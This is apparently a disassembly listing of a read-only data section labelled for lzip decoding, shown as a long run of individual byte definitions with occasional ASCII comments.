.rodata.lzip_decode0:000000000000B81F                 db    0
.rodata.lzip_decode0:000000000000B820                 db 0F3h
.rodata.lzip_decode0:000000000000B821                 db    0
.rodata.lzip_decode0:000000000000B822                 db    0
.rodata.lzip_decode0:000000000000B823                 db    0
.rodata.lzip_decode0:000000000000B824                 db  92h
.rodata.lzip_decode0:000000000000B825                 db    0
.rodata.lzip_decode0:000000000000B826                 db    0
.rodata.lzip_decode0:000000000000B827                 db    0
.rodata.lzip_decode0:000000000000B828                 db  22h ; "
.rodata.lzip_decode0:000000000000B829                 db    1
.rodata.lzip_decode0:000000000000B82A                 db    0
.rodata.lzip_decode0:000000000000B82B                 db    0
.rodata.lzip_decode0:000000000000B82C                 db 0A2h
.rodata.lzip_decode0:000000000000B82D                 db    3
.rodata.lzip_decode0:000000000000B82E                 db    0
.rodata.lzip_decode0:000000000000B82F                 db    0
.rodata.lzip_decode0:000000000000B830                 db 0B3h
.rodata.lzip_decode0:000000000000B831                 db    4
.rodata.lzip_decode0:000000000000B832                 db    0
.rodata.lzip_decode0:000000000000B833                 db    0
.rodata.lzip_decode0:000000000000B834                 db  82h
.rodata.lzip_decode0:000000000000B835                 db    0
.rodata.lzip_decode0:000000000000B836                 db    0
.rodata.lzip_decode0:000000000000B837                 db    0
.rodata.lzip_decode0:000000000000B838                 db 0F2h
.rodata.lzip_decode0:000000000000B839                 db    0
.rodata.lzip_decode0:000000000000B83A                 db    0
.rodata.lzip_decode0:000000000000B83B                 db    0
.rodata.lzip_decode0:000000000000B83C                 db  63h ; c
.rodata.lzip_decode0:000000000000B83D                 db    2
.rodata.lzip_decode0:000000000000B83E                 db    0
.rodata.lzip_decode0:000000000000B83F                 db    0
.rodata.lzip_decode0:000000000000B840                 db 0C2h
.rodata.lzip_decode0:000000000000B841                 db    1
.rodata.lzip_decode0:000000000000B842                 db    0
.rodata.lzip_decode0:000000000000B843                 db    0
.rodata.lzip_decode0:000000000000B844                 db  33h ; 3
.rodata.lzip_decode0:000000000000B845                 db    0
.rodata.lzip_decode0:000000000000B846                 db    0
.rodata.lzip_decode0:000000000000B847                 db    0
.rodata.lzip_decode0:000000000000B848                 db 0B3h
.rodata.lzip_decode0:000000000000B849                 db    1
.rodata.lzip_decode0:000000000000B84A                 db    0
.rodata.lzip_decode0:000000000000B84B                 db    0
.rodata.lzip_decode0:000000000000B84C                 db  32h ; 2
.rodata.lzip_decode0:000000000000B84D                 db    1
.rodata.lzip_decode0:000000000000B84E                 db    0
.rodata.lzip_decode0:000000000000B84F                 db    0
.rodata.lzip_decode0:000000000000B850                 db    4
.rodata.lzip_decode0:000000000000B851                 db    0
.rodata.lzip_decode0:000000000000B852                 db  58h ; X
.rodata.lzip_decode0:000000000000B853                 db    1
.rodata.lzip_decode0:000000000000B854                 db 0D2h
.rodata.lzip_decode0:000000000000B855                 db    1
.rodata.lzip_decode0:000000000000B856                 db    0
.rodata.lzip_decode0:000000000000B857                 db    0
.rodata.lzip_decode0:000000000000B858                 db    3
.rodata.lzip_decode0:000000000000B859                 db    0
.rodata.lzip_decode0:000000000000B85A                 db    0
.rodata.lzip_decode0:000000000000B85B                 db    0
.rodata.lzip_decode0:000000000000B85C                 db    3
.rodata.lzip_decode0:000000000000B85D                 db    0
.rodata.lzip_decode0:000000000000B85E                 db    0
.rodata.lzip_decode0:000000000000B85F                 db    0
.rodata.lzip_decode0:000000000000B860                 db    3
.rodata.lzip_decode0:000000000000B861                 db    0
.rodata.lzip_decode0:000000000000B862                 db    0
.rodata.lzip_decode0:000000000000B863                 db    0
.rodata.lzip_decode0:000000000000B864                 db    3
.rodata.lzip_decode0:000000000000B865                 db    0
.rodata.lzip_decode0:000000000000B866                 db    0
.rodata.lzip_decode0:000000000000B867                 db    0
.rodata.lzip_decode0:000000000000B868                 db  62h ; b
.rodata.lzip_decode0:000000000000B869                 db    0
.rodata.lzip_decode0:000000000000B86A                 db    0
.rodata.lzip_decode0:000000000000B86B                 db    0
.rodata.lzip_decode0:000000000000B86C                 db 0C2h
.rodata.lzip_decode0:000000000000B86D                 db    0
.rodata.lzip_decode0:000000000000B86E                 db    0
.rodata.lzip_decode0:000000000000B86F                 db    0
.rodata.lzip_decode0:000000000000B870                 db  13h
.rodata.lzip_decode0:000000000000B871                 db    2
.rodata.lzip_decode0:000000000000B872                 db    0
.rodata.lzip_decode0:000000000000B873                 db    0
.rodata.lzip_decode0:000000000000B874                 db 0F2h
.rodata.lzip_decode0:000000000000B875                 db    1
.rodata.lzip_decode0:000000000000B876                 db    0
.rodata.lzip_decode0:000000000000B877                 db    0
.rodata.lzip_decode0:000000000000B878                 db 0F3h
.rodata.lzip_decode0:000000000000B879                 db    1
.rodata.lzip_decode0:000000000000B87A                 db    0
.rodata.lzip_decode0:000000000000B87B                 db    0
.rodata.lzip_decode0:000000000000B87C                 db  62h ; b
.rodata.lzip_decode0:000000000000B87D                 db    0
.rodata.lzip_decode0:000000000000B87E                 db    0
.rodata.lzip_decode0:000000000000B87F                 db    0
.rodata.lzip_decode0:000000000000B880                 db    3
.rodata.lzip_decode0:000000000000B881                 db    0
.rodata.lzip_decode0:000000000000B882                 db    0
.rodata.lzip_decode0:000000000000B883                 db    0
.rodata.lzip_decode0:000000000000B884                 db  33h ; 3
.rodata.lzip_decode0:000000000000B885                 db    0
.rodata.lzip_decode0:000000000000B886                 db    0
.rodata.lzip_decode0:000000000000B887                 db    0
.rodata.lzip_decode0:000000000000B888                 db    3
.rodata.lzip_decode0:000000000000B889                 db    0
.rodata.lzip_decode0:000000000000B88A                 db    0
.rodata.lzip_decode0:000000000000B88B                 db    0
.rodata.lzip_decode0:000000000000B88C                 db    4
.rodata.lzip_decode0:000000000000B88D                 db    0
.rodata.lzip_decode0:000000000000B88E                 db  78h ; x
.rodata.lzip_decode0:000000000000B88F                 db    8
.rodata.lzip_decode0:000000000000B890                 db 0E2h
.rodata.lzip_decode0:000000000000B891                 db    0
.rodata.lzip_decode0:000000000000B892                 db    0
.rodata.lzip_decode0:000000000000B893                 db    0
.rodata.lzip_decode0:000000000000B894                 db  63h ; c
.rodata.lzip_decode0:000000000000B895                 db    1
.rodata.lzip_decode0:000000000000B896                 db    0
.rodata.lzip_decode0:000000000000B897                 db    0
.rodata.lzip_decode0:000000000000B898                 db 0B2h
.rodata.lzip_decode0:000000000000B899                 db    0
.rodata.lzip_decode0:000000000000B89A                 db    0
.rodata.lzip_decode0:000000000000B89B                 db    0
.rodata.lzip_decode0:000000000000B89C                 db  22h ; "
.rodata.lzip_decode0:000000000000B89D                 db    1
.rodata.lzip_decode0:000000000000B89E                 db    0
.rodata.lzip_decode0:000000000000B89F                 db    0
.rodata.lzip_decode0:000000000000B8A0                 db  62h ; b
.rodata.lzip_decode0:000000000000B8A1                 db    0
.rodata.lzip_decode0:000000000000B8A2                 db    0
.rodata.lzip_decode0:000000000000B8A3                 db    0
.rodata.lzip_decode0:000000000000B8A4                 db 0A3h
.rodata.lzip_decode0:000000000000B8A5                 db    0
.rodata.lzip_decode0:000000000000B8A6                 db    0
.rodata.lzip_decode0:000000000000B8A7                 db    0
.rodata.lzip_decode0:000000000000B8A8                 db 0E3h
.rodata.lzip_decode0:000000000000B8A9                 db    1
.rodata.lzip_decode0:000000000000B8AA                 db    0
.rodata.lzip_decode0:000000000000B8AB                 db    0
.rodata.lzip_decode0:000000000000B8AC                 db  82h
.rodata.lzip_decode0:000000000000B8AD                 db    0
.rodata.lzip_decode0:000000000000B8AE                 db    0
.rodata.lzip_decode0:000000000000B8AF                 db    0
.rodata.lzip_decode0:000000000000B8B0                 db  72h ; r
.rodata.lzip_decode0:000000000000B8B1                 db    1
.rodata.lzip_decode0:000000000000B8B2                 db    0
.rodata.lzip_decode0:000000000000B8B3                 db    0
.rodata.lzip_decode0:000000000000B8B4                 db  23h ; #
.rodata.lzip_decode0:000000000000B8B5                 db    2
.rodata.lzip_decode0:000000000000B8B6                 db    0
.rodata.lzip_decode0:000000000000B8B7                 db    0
.rodata.lzip_decode0:000000000000B8B8                 db  42h ; B
.rodata.lzip_decode0:000000000000B8B9                 db    1
.rodata.lzip_decode0:000000000000B8BA                 db    0
.rodata.lzip_decode0:000000000000B8BB                 db    0
.rodata.lzip_decode0:000000000000B8BC                 db  53h ; S
.rodata.lzip_decode0:000000000000B8BD                 db    1
.rodata.lzip_decode0:000000000000B8BE                 db    0
.rodata.lzip_decode0:000000000000B8BF                 db    0
.rodata.lzip_decode0:000000000000B8C0                 db  13h
.rodata.lzip_decode0:000000000000B8C1                 db    0
.rodata.lzip_decode0:000000000000B8C2                 db    0
.rodata.lzip_decode0:000000000000B8C3                 db    0
.rodata.lzip_decode0:000000000000B8C4                 db    4
.rodata.lzip_decode0:000000000000B8C5                 db    0
.rodata.lzip_decode0:000000000000B8C6                 db 0B0h
.rodata.lzip_decode0:000000000000B8C7                 db    2
.rodata.lzip_decode0:000000000000B8C8                 db  12h
.rodata.lzip_decode0:000000000000B8C9                 db    0
.rodata.lzip_decode0:000000000000B8CA                 db    0
.rodata.lzip_decode0:000000000000B8CB                 db    0
.rodata.lzip_decode0:000000000000B8CC                 db 0C2h
.rodata.lzip_decode0:000000000000B8CD                 db    0
.rodata.lzip_decode0:000000000000B8CE                 db    0
.rodata.lzip_decode0:000000000000B8CF                 db    0
.rodata.lzip_decode0:000000000000B8D0                 db  52h ; R
.rodata.lzip_decode0:000000000000B8D1                 db    0
.rodata.lzip_decode0:000000000000B8D2                 db    0
.rodata.lzip_decode0:000000000000B8D3                 db    0
.rodata.lzip_decode0:000000000000B8D4                 db  52h ; R
.rodata.lzip_decode0:000000000000B8D5                 db    0
.rodata.lzip_decode0:000000000000B8D6                 db    0
.rodata.lzip_decode0:000000000000B8D7                 db    0
.rodata.lzip_decode0:000000000000B8D8                 db  63h ; c
.rodata.lzip_decode0:000000000000B8D9                 db    0
.rodata.lzip_decode0:000000000000B8DA                 db    0
.rodata.lzip_decode0:000000000000B8DB                 db    0
.rodata.lzip_decode0:000000000000B8DC                 db    4
.rodata.lzip_decode0:000000000000B8DD                 db    0
.rodata.lzip_decode0:000000000000B8DE                 db  28h ; (
.rodata.lzip_decode0:000000000000B8DF                 db    2
.rodata.lzip_decode0:000000000000B8E0                 db 0E2h
.rodata.lzip_decode0:000000000000B8E1                 db    0
.rodata.lzip_decode0:000000000000B8E2                 db    0
.rodata.lzip_decode0:000000000000B8E3                 db    0
.rodata.lzip_decode0:000000000000B8E4                 db 0A3h
.rodata.lzip_decode0:000000000000B8E5                 db    0
.rodata.lzip_decode0:000000000000B8E6                 db    0
.rodata.lzip_decode0:000000000000B8E7                 db    0
.rodata.lzip_decode0:000000000000B8E8                 db  92h
.rodata.lzip_decode0:000000000000B8E9                 db    1
.rodata.lzip_decode0:000000000000B8EA                 db    0
.rodata.lzip_decode0:000000000000B8EB                 db    0
.rodata.lzip_decode0:000000000000B8EC                 db  83h
.rodata.lzip_decode0:000000000000B8ED                 db    2
.rodata.lzip_decode0:000000000000B8EE                 db    0
.rodata.lzip_decode0:000000000000B8EF                 db    0
.rodata.lzip_decode0:000000000000B8F0                 db  12h
.rodata.lzip_decode0:000000000000B8F1                 db    2
.rodata.lzip_decode0:000000000000B8F2                 db    0
.rodata.lzip_decode0:000000000000B8F3                 db    0
.rodata.lzip_decode0:000000000000B8F4                 db  33h ; 3
.rodata.lzip_decode0:000000000000B8F5                 db    0
.rodata.lzip_decode0:000000000000B8F6                 db    0
.rodata.lzip_decode0:000000000000B8F7                 db    0
.rodata.lzip_decode0:000000000000B8F8                 db 0A0h
.rodata.lzip_decode0:000000000000B8F9                 db    3
.rodata.lzip_decode0:000000000000B8FA                 db  1Ch
.rodata.lzip_decode0:000000000000B8FB                 db    0
.rodata.lzip_decode0:000000000000B8FC                 db  72h ; r
.rodata.lzip_decode0:000000000000B8FD                 db    3
.rodata.lzip_decode0:000000000000B8FE                 db    0
.rodata.lzip_decode0:000000000000B8FF                 db    0
.rodata.lzip_decode0:000000000000B900                 db  21h ; !
.rodata.lzip_decode0:000000000000B901                 db    3
.rodata.lzip_decode0:000000000000B902                 db    4
.rodata.lzip_decode0:000000000000B903                 db    0
.rodata.lzip_decode0:000000000000B904                 db  83h
.rodata.lzip_decode0:000000000000B905                 db    0
.rodata.lzip_decode0:000000000000B906                 db    0
.rodata.lzip_decode0:000000000000B907                 db    0
.rodata.lzip_decode0:000000000000B908                 db 0C3h
.rodata.lzip_decode0:000000000000B909                 db    1
.rodata.lzip_decode0:000000000000B90A                 db    0
.rodata.lzip_decode0:000000000000B90B                 db    0
.rodata.lzip_decode0:000000000000B90C                 db 0C2h
.rodata.lzip_decode0:000000000000B90D                 db    1
.rodata.lzip_decode0:000000000000B90E                 db    0
.rodata.lzip_decode0:000000000000B90F                 db    0
.rodata.lzip_decode0:000000000000B910                 db  53h ; S
.rodata.lzip_decode0:000000000000B911                 db    0
.rodata.lzip_decode0:000000000000B912                 db    0
.rodata.lzip_decode0:000000000000B913                 db    0
.rodata.lzip_decode0:000000000000B914                 db  83h
.rodata.lzip_decode0:000000000000B915                 db    0
.rodata.lzip_decode0:000000000000B916                 db    0
.rodata.lzip_decode0:000000000000B917                 db    0
.rodata.lzip_decode0:000000000000B918                 db 0B3h
.rodata.lzip_decode0:000000000000B919                 db    0
.rodata.lzip_decode0:000000000000B91A                 db    0
.rodata.lzip_decode0:000000000000B91B                 db    0
.rodata.lzip_decode0:000000000000B91C                 db  60h ; `
.rodata.lzip_decode0:000000000000B91D                 db    5
.rodata.lzip_decode0:000000000000B91E                 db  58h ; X
.rodata.lzip_decode0:000000000000B91F                 db    0
.rodata.lzip_decode0:000000000000B920                 db 0B2h
.rodata.lzip_decode0:000000000000B921                 db    4
.rodata.lzip_decode0:000000000000B922                 db    0
.rodata.lzip_decode0:000000000000B923                 db    0
.rodata.lzip_decode0:000000000000B924                 db    4
.rodata.lzip_decode0:000000000000B925                 db    0
.rodata.lzip_decode0:000000000000B926                 db  60h ; `
.rodata.lzip_decode0:000000000000B927                 db  0Ah
.rodata.lzip_decode0:000000000000B928                 db  82h
.rodata.lzip_decode0:000000000000B929                 db    1
.rodata.lzip_decode0:000000000000B92A                 db    0
.rodata.lzip_decode0:000000000000B92B                 db    0
.rodata.lzip_decode0:000000000000B92C                 db  43h ; C
.rodata.lzip_decode0:000000000000B92D                 db    1
.rodata.lzip_decode0:000000000000B92E                 db    0
.rodata.lzip_decode0:000000000000B92F                 db    0
.rodata.lzip_decode0:000000000000B930                 db  82h
.rodata.lzip_decode0:000000000000B931                 db    0
.rodata.lzip_decode0:000000000000B932                 db    0
.rodata.lzip_decode0:000000000000B933                 db    0
.rodata.lzip_decode0:000000000000B934                 db 0A3h
.rodata.lzip_decode0:000000000000B935                 db    0
.rodata.lzip_decode0:000000000000B936                 db    0
.rodata.lzip_decode0:000000000000B937                 db    0
.rodata.lzip_decode0:000000000000B938                 db 0E2h
.rodata.lzip_decode0:000000000000B939                 db    0
.rodata.lzip_decode0:000000000000B93A                 db    0
.rodata.lzip_decode0:000000000000B93B                 db    0
.rodata.lzip_decode0:000000000000B93C                 db 0B3h
.rodata.lzip_decode0:000000000000B93D                 db    1
.rodata.lzip_decode0:000000000000B93E                 db    0
.rodata.lzip_decode0:000000000000B93F                 db    0
.rodata.lzip_decode0:000000000000B940                 db    4
.rodata.lzip_decode0:000000000000B941                 db    0
.rodata.lzip_decode0:000000000000B942                 db 0C8h
.rodata.lzip_decode0:000000000000B943                 db    9
.rodata.lzip_decode0:000000000000B944                 db  82h
.rodata.lzip_decode0:000000000000B945                 db    1
.rodata.lzip_decode0:000000000000B946                 db    0
.rodata.lzip_decode0:000000000000B947                 db    0
.rodata.lzip_decode0:000000000000B948                 db  73h ; s
.rodata.lzip_decode0:000000000000B949                 db    1
.rodata.lzip_decode0:000000000000B94A                 db    0
.rodata.lzip_decode0:000000000000B94B                 db    0
.rodata.lzip_decode0:000000000000B94C                 db 0C2h
.rodata.lzip_decode0:000000000000B94D                 db    1
.rodata.lzip_decode0:000000000000B94E                 db    0
.rodata.lzip_decode0:000000000000B94F                 db    0
.rodata.lzip_decode0:000000000000B950                 db  63h ; c
.rodata.lzip_decode0:000000000000B951                 db    0
.rodata.lzip_decode0:000000000000B952                 db    0
.rodata.lzip_decode0:000000000000B953                 db    0
.rodata.lzip_decode0:000000000000B954                 db 0A3h
.rodata.lzip_decode0:000000000000B955                 db    1
.rodata.lzip_decode0:000000000000B956                 db    0
.rodata.lzip_decode0:000000000000B957                 db    0
.rodata.lzip_decode0:000000000000B958                 db 0C2h
.rodata.lzip_decode0:000000000000B959                 db    0
.rodata.lzip_decode0:000000000000B95A                 db    0
.rodata.lzip_decode0:000000000000B95B                 db    0
.rodata.lzip_decode0:000000000000B95C                 db 0A3h
.rodata.lzip_decode0:000000000000B95D                 db    0
.rodata.lzip_decode0:000000000000B95E                 db    0
.rodata.lzip_decode0:000000000000B95F                 db    0
.rodata.lzip_decode0:000000000000B960                 db  92h
.rodata.lzip_decode0:000000000000B961                 db    0
.rodata.lzip_decode0:000000000000B962                 db    0
.rodata.lzip_decode0:000000000000B963                 db    0
.rodata.lzip_decode0:000000000000B964                 db  83h
.rodata.lzip_decode0:000000000000B965                 db    1
.rodata.lzip_decode0:000000000000B966                 db    0
.rodata.lzip_decode0:000000000000B967                 db    0
.rodata.lzip_decode0:000000000000B968                 db 0A2h
.rodata.lzip_decode0:000000000000B969                 db    1
.rodata.lzip_decode0:000000000000B96A                 db    0
.rodata.lzip_decode0:000000000000B96B                 db    0
.rodata.lzip_decode0:000000000000B96C                 db  70h ; p
.rodata.lzip_decode0:000000000000B96D                 db    5
.rodata.lzip_decode0:000000000000B96E                 db  2Ch ; ,
.rodata.lzip_decode0:000000000000B96F                 db    0
.rodata.lzip_decode0:000000000000B970                 db 0E2h
.rodata.lzip_decode0:000000000000B971                 db    3
.rodata.lzip_decode0:000000000000B972                 db    0
.rodata.lzip_decode0:000000000000B973                 db    0
.rodata.lzip_decode0:000000000000B974                 db  91h
.rodata.lzip_decode0:000000000000B975                 db    3
.rodata.lzip_decode0:000000000000B976                 db    4
.rodata.lzip_decode0:000000000000B977                 db    0
.rodata.lzip_decode0:000000000000B978                 db  33h ; 3
.rodata.lzip_decode0:000000000000B979                 db    0
.rodata.lzip_decode0:000000000000B97A                 db    0
.rodata.lzip_decode0:000000000000B97B                 db    0
.rodata.lzip_decode0:000000000000B97C                 db  43h ; C
.rodata.lzip_decode0:000000000000B97D                 db    1
.rodata.lzip_decode0:000000000000B97E                 db    0
.rodata.lzip_decode0:000000000000B97F                 db    0
.rodata.lzip_decode0:000000000000B980                 db  53h ; S
.rodata.lzip_decode0:000000000000B981                 db    0
.rodata.lzip_decode0:000000000000B982                 db    0
.rodata.lzip_decode0:000000000000B983                 db    0
.rodata.lzip_decode0:000000000000B984                 db 0E2h
.rodata.lzip_decode0:000000000000B985                 db    0
.rodata.lzip_decode0:000000000000B986                 db    0
.rodata.lzip_decode0:000000000000B987                 db    0
.rodata.lzip_decode0:000000000000B988                 db 0E2h
.rodata.lzip_decode0:000000000000B989                 db    0
.rodata.lzip_decode0:000000000000B98A                 db    0
.rodata.lzip_decode0:000000000000B98B                 db    0
.rodata.lzip_decode0:000000000000B98C                 db  63h ; c
.rodata.lzip_decode0:000000000000B98D                 db    0
.rodata.lzip_decode0:000000000000B98E                 db    0
.rodata.lzip_decode0:000000000000B98F                 db    0
.rodata.lzip_decode0:000000000000B990                 db  93h
.rodata.lzip_decode0:000000000000B991                 db    1
.rodata.lzip_decode0:000000000000B992                 db    0
.rodata.lzip_decode0:000000000000B993                 db    0
.rodata.lzip_decode0:000000000000B994                 db    4
.rodata.lzip_decode0:000000000000B995                 db    0
.rodata.lzip_decode0:000000000000B996                 db 0A8h
.rodata.lzip_decode0:000000000000B997                 db    8
.rodata.lzip_decode0:000000000000B998                 db  82h
.rodata.lzip_decode0:000000000000B999                 db    1
.rodata.lzip_decode0:000000000000B99A                 db    0
.rodata.lzip_decode0:000000000000B99B                 db    0
.rodata.lzip_decode0:000000000000B99C                 db  43h ; C
.rodata.lzip_decode0:000000000000B99D                 db    1
.rodata.lzip_decode0:000000000000B99E                 db    0
.rodata.lzip_decode0:000000000000B99F                 db    0
.rodata.lzip_decode0:000000000000B9A0                 db 0F2h
.rodata.lzip_decode0:000000000000B9A1                 db    2
.rodata.lzip_decode0:000000000000B9A2                 db    0
.rodata.lzip_decode0:000000000000B9A3                 db    0
.rodata.lzip_decode0:000000000000B9A4                 db    4
.rodata.lzip_decode0:000000000000B9A5                 db    0
.rodata.lzip_decode0:000000000000B9A6                 db 0B0h
.rodata.lzip_decode0:000000000000B9A7                 db    5
.rodata.lzip_decode0:000000000000B9A8                 db 0E2h
.rodata.lzip_decode0:000000000000B9A9                 db    1
.rodata.lzip_decode0:000000000000B9AA                 db    0
.rodata.lzip_decode0:000000000000B9AB                 db    0
.rodata.lzip_decode0:000000000000B9AC                 db 0F3h
.rodata.lzip_decode0:000000000000B9AD                 db    0
.rodata.lzip_decode0:000000000000B9AE                 db    0
.rodata.lzip_decode0:000000000000B9AF                 db    0
.rodata.lzip_decode0:000000000000B9B0                 db  23h ; #
.rodata.lzip_decode0:000000000000B9B1                 db    0
.rodata.lzip_decode0:000000000000B9B2                 db    0
.rodata.lzip_decode0:000000000000B9B3                 db    0
.rodata.lzip_decode0:000000000000B9B4                 db  42h ; B
.rodata.lzip_decode0:000000000000B9B5                 db    0
.rodata.lzip_decode0:000000000000B9B6                 db    0
.rodata.lzip_decode0:000000000000B9B7                 db    0
.rodata.lzip_decode0:000000000000B9B8                 db  43h ; C
.rodata.lzip_decode0:000000000000B9B9                 db    1
.rodata.lzip_decode0:000000000000B9BA                 db    0
.rodata.lzip_decode0:000000000000B9BB                 db    0
.rodata.lzip_decode0:000000000000B9BC                 db    4
.rodata.lzip_decode0:000000000000B9BD                 db    0
.rodata.lzip_decode0:000000000000B9BE                 db  98h
.rodata.lzip_decode0:000000000000B9BF                 db  0Ah
.rodata.lzip_decode0:000000000000B9C0                 db  73h ; s
.rodata.lzip_decode0:000000000000B9C1                 db    0
.rodata.lzip_decode0:000000000000B9C2                 db    0
.rodata.lzip_decode0:000000000000B9C3                 db    0
.rodata.lzip_decode0:000000000000B9C4                 db    3
.rodata.lzip_decode0:000000000000B9C5                 db    0
.rodata.lzip_decode0:000000000000B9C6                 db    0
.rodata.lzip_decode0:000000000000B9C7                 db    0
.rodata.lzip_decode0:000000000000B9C8                 db    4
.rodata.lzip_decode0:000000000000B9C9                 db    0
.rodata.lzip_decode0:000000000000B9CA                 db 0B8h
.rodata.lzip_decode0:000000000000B9CB                 db    5
.rodata.lzip_decode0:000000000000B9CC                 db  82h
.rodata.lzip_decode0:000000000000B9CD                 db    5
.rodata.lzip_decode0:000000000000B9CE                 db    0
.rodata.lzip_decode0:000000000000B9CF                 db    0
.rodata.lzip_decode0:000000000000B9D0                 db  21h ; !
.rodata.lzip_decode0:000000000000B9D1                 db    5
.rodata.lzip_decode0:000000000000B9D2                 db    4
.rodata.lzip_decode0:000000000000B9D3                 db    0
.rodata.lzip_decode0:000000000000B9D4                 db 0C2h
.rodata.lzip_decode0:000000000000B9D5                 db    1
.rodata.lzip_decode0:000000000000B9D6                 db    0
.rodata.lzip_decode0:000000000000B9D7                 db    0
.rodata.lzip_decode0:000000000000B9D8                 db  13h
.rodata.lzip_decode0:000000000000B9D9                 db    1
.rodata.lzip_decode0:000000000000B9DA                 db    0
.rodata.lzip_decode0:000000000000B9DB                 db    0
.rodata.lzip_decode0:000000000000B9DC                 db  73h ; s
.rodata.lzip_decode0:000000000000B9DD                 db    1
.rodata.lzip_decode0:000000000000B9DE                 db    0
.rodata.lzip_decode0:000000000000B9DF                 db    0
.rodata.lzip_decode0:000000000000B9E0                 db  82h
.rodata.lzip_decode0:000000000000B9E1                 db    0
.rodata.lzip_decode0:000000000000B9E2                 db    0
.rodata.lzip_decode0:000000000000B9E3                 db    0
.rodata.lzip_decode0:000000000000B9E4                 db 0B2h
.rodata.lzip_decode0:000000000000B9E5                 db    1
.rodata.lzip_decode0:000000000000B9E6                 db    0
.rodata.lzip_decode0:000000000000B9E7                 db    0
.rodata.lzip_decode0:000000000000B9E8                 db  53h ; S
.rodata.lzip_decode0:000000000000B9E9                 db    0
.rodata.lzip_decode0:000000000000B9EA                 db    0
.rodata.lzip_decode0:000000000000B9EB                 db    0
.rodata.lzip_decode0:000000000000B9EC                 db 0A3h
.rodata.lzip_decode0:000000000000B9ED                 db    1
.rodata.lzip_decode0:000000000000B9EE                 db    0
.rodata.lzip_decode0:000000000000B9EF                 db    0
.rodata.lzip_decode0:000000000000B9F0                 db    3
.rodata.lzip_decode0:000000000000B9F1                 db    0
.rodata.lzip_decode0:000000000000B9F2                 db    0
.rodata.lzip_decode0:000000000000B9F3                 db    0
.rodata.lzip_decode0:000000000000B9F4                 db  20h
.rodata.lzip_decode0:000000000000B9F5                 db    5
.rodata.lzip_decode0:000000000000B9F6                 db  38h ; 8
.rodata.lzip_decode0:000000000000B9F7                 db    0
.rodata.lzip_decode0:000000000000B9F8                 db  12h
.rodata.lzip_decode0:000000000000B9F9                 db    5
.rodata.lzip_decode0:000000000000B9FA                 db    0
.rodata.lzip_decode0:000000000000B9FB                 db    0
.rodata.lzip_decode0:000000000000B9FC                 db  30h ; 0
.rodata.lzip_decode0:000000000000B9FD                 db    0
.rodata.lzip_decode0:000000000000B9FE                 db 0DCh
.rodata.lzip_decode0:000000000000B9FF                 db    0
.rodata.lzip_decode0:000000000000BA00                 db  20h
.rodata.lzip_decode0:000000000000BA01                 db    5
.rodata.lzip_decode0:000000000000BA02                 db  68h ; h
.rodata.lzip_decode0:000000000000BA03                 db    0
.rodata.lzip_decode0:000000000000BA04                 db 0F0h
.rodata.lzip_decode0:000000000000BA05                 db    1
.rodata.lzip_decode0:000000000000BA06                 db  58h ; X
.rodata.lzip_decode0:000000000000BA07                 db    0
.rodata.lzip_decode0:000000000000BA08                 db    1
.rodata.lzip_decode0:000000000000BA09                 db    0
.rodata.lzip_decode0:000000000000BA0A                 db    4
.rodata.lzip_decode0:000000000000BA0B                 db    0
.rodata.lzip_decode0:000000000000BA0C                 db    4
.rodata.lzip_decode0:000000000000BA0D                 db    0
.rodata.lzip_decode0:000000000000BA0E                 db 0B8h
.rodata.lzip_decode0:000000000000BA0F                 db    0
.rodata.lzip_decode0:000000000000BA10                 db  12h
.rodata.lzip_decode0:000000000000BA11                 db    0
.rodata.lzip_decode0:000000000000BA12                 db    0
.rodata.lzip_decode0:000000000000BA13                 db    0
.rodata.lzip_decode0:000000000000BA14                 db  22h ; "
.rodata.lzip_decode0:000000000000BA15                 db    1
.rodata.lzip_decode0:000000000000BA16                 db    0
.rodata.lzip_decode0:000000000000BA17                 db    0
.rodata.lzip_decode0:000000000000BA18                 db  33h ; 3
.rodata.lzip_decode0:000000000000BA19                 db    0
.rodata.lzip_decode0:000000000000BA1A                 db    0
.rodata.lzip_decode0:000000000000BA1B                 db    0
.rodata.lzip_decode0:000000000000BA1C                 db 0A3h
.rodata.lzip_decode0:000000000000BA1D                 db    1
.rodata.lzip_decode0:000000000000BA1E                 db    0
.rodata.lzip_decode0:000000000000BA1F                 db    0
.rodata.lzip_decode0:000000000000BA20                 db  82h
.rodata.lzip_decode0:000000000000BA21                 db    0
.rodata.lzip_decode0:000000000000BA22                 db    0
.rodata.lzip_decode0:000000000000BA23                 db    0
.rodata.lzip_decode0:000000000000BA24                 db  13h
.rodata.lzip_decode0:000000000000BA25                 db    0
.rodata.lzip_decode0:000000000000BA26                 db    0
.rodata.lzip_decode0:000000000000BA27                 db    0
.rodata.lzip_decode0:000000000000BA28                 db 0C2h
.rodata.lzip_decode0:000000000000BA29                 db    1
.rodata.lzip_decode0:000000000000BA2A                 db    0
.rodata.lzip_decode0:000000000000BA2B                 db    0
.rodata.lzip_decode0:000000000000BA2C                 db  63h ; c
.rodata.lzip_decode0:000000000000BA2D                 db    0
.rodata.lzip_decode0:000000000000BA2E                 db    0
.rodata.lzip_decode0:000000000000BA2F                 db    0
.rodata.lzip_decode0:000000000000BA30                 db  33h ; 3
.rodata.lzip_decode0:000000000000BA31                 db    0
.rodata.lzip_decode0:000000000000BA32                 db    0
.rodata.lzip_decode0:000000000000BA33                 db    0
.rodata.lzip_decode0:000000000000BA34                 db    3
.rodata.lzip_decode0:000000000000BA35                 db    2
.rodata.lzip_decode0:000000000000BA36                 db    0
.rodata.lzip_decode0:000000000000BA37                 db    0
.rodata.lzip_decode0:000000000000BA38                 db  13h
.rodata.lzip_decode0:000000000000BA39                 db    0
.rodata.lzip_decode0:000000000000BA3A                 db    0
.rodata.lzip_decode0:000000000000BA3B                 db    0
.rodata.lzip_decode0:000000000000BA3C                 db    3
.rodata.lzip_decode0:000000000000BA3D                 db    0
.rodata.lzip_decode0:000000000000BA3E                 db    0
.rodata.lzip_decode0:000000000000BA3F                 db    0
.rodata.lzip_decode0:000000000000BA40                 db    4
.rodata.lzip_decode0:000000000000BA41                 db    0
.rodata.lzip_decode0:000000000000BA42                 db 0D8h
.rodata.lzip_decode0:000000000000BA43                 db    1
.rodata.lzip_decode0:000000000000BA44                 db  13h
.rodata.lzip_decode0:000000000000BA45                 db    1
.rodata.lzip_decode0:000000000000BA46                 db    0
.rodata.lzip_decode0:000000000000BA47                 db    0
.rodata.lzip_decode0:000000000000BA48                 db 0A3h
.rodata.lzip_decode0:000000000000BA49                 db    0
.rodata.lzip_decode0:000000000000BA4A                 db    0
.rodata.lzip_decode0:000000000000BA4B                 db    0
.rodata.lzip_decode0:000000000000BA4C                 db  22h ; "
.rodata.lzip_decode0:000000000000BA4D                 db    1
